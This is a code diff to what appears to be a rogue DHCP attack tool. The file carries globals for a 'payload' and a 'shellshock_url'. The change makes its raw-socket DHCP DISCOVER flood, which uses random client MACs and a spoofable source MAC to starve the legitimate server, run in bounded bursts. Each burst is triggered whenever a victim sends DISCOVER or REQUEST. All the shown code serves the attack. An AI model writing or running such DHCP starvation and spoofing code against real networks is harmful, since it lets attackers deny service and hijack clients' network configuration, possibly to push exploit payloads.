@@ -118,6 +118,8 @@ domain = None
 payload = None
 
 SOCK = None
+
+discover_sender_is_work = False
 # endregion
 
 # region Get your network settings
@@ -391,13 +393,17 @@ def make_dhcp_nak_packet(transaction_id, requested_ip, target_ip):
 
 
 # region Send DHCP discover packets
-def discover_sender():
+def discover_sender(number_of_packets=999999):
+    global discover_sender_is_work
+    discover_sender_is_work = True
+
+    packet_index = 0
     SOCK = socket(AF_PACKET, SOCK_RAW)
     SOCK.bind((current_network_interface, 0))
 
     if dhcp_discover_packets_source_mac != your_mac_address:
         relay_agent_ip_address = Base.get_netiface_random_ip(current_network_interface)
-        while True:
+        while packet_index < number_of_packets:
             try:
                 discover_packet = dhcp.make_discover_packet(source_mac=dhcp_discover_packets_source_mac,
                                                             client_mac=eth.get_random_mac(),
@@ -406,10 +412,11 @@ def discover_sender():
                 SOCK.send(discover_packet)
                 sleep(args.discover_delay)
             except:
-                break
+                Base.print_error("Something went wrong when sending DHCP discover packets!")
+            packet_index += 1
 
     else:
-        while True:
+        while packet_index < number_of_packets:
             try:
                 discover_packet = dhcp.make_discover_packet(source_mac=dhcp_discover_packets_source_mac,
                                                             client_mac=eth.get_random_mac(),
@@ -418,10 +425,11 @@ def discover_sender():
                 SOCK.send(discover_packet)
                 sleep(args.discover_delay)
             except:
-                break
+                Base.print_error("Something went wrong when sending DHCP discover packets!")
+            packet_index += 1
 
     SOCK.close()
-    Base.print_error("Something went wrong when sending DHCP discover packets!")
+    discover_sender_is_work = False
 # endregion
 
 
@@ -435,6 +443,7 @@ def reply(request):
     global payload
     global shellshock_url
     global args
+    global discover_sender_is_work
     # endregion
 
     # region DHCP
@@ -453,7 +462,14 @@ def reply(request):
 
         # region DHCP DISCOVER
         if request[DHCP].options[0][1] == 1:
+            # region Start DHCP discover sender
+            if not discover_sender_is_work:
+                discover_sender(100)
+            # endregion
+
+            # region Print INFO message
             Base.print_info("DHCP DISCOVER from: ", client_mac_address, " transaction id: ", hex(transaction_id))
+            # endregion
 
             # If target IP address is set - offer IP = target IP
             if target_ip_address is not None:
@@ -540,6 +556,11 @@ def reply(request):
 
         # region DHCP REQUEST
         if request[DHCP].options[0][1] == 3:
+            # region Start DHCP discover sender
+            if not discover_sender_is_work:
+                discover_sender(100)
+            # endregion
+
             # region Set local variables
             requested_ip = "0.0.0.0"
             offer_ip = None
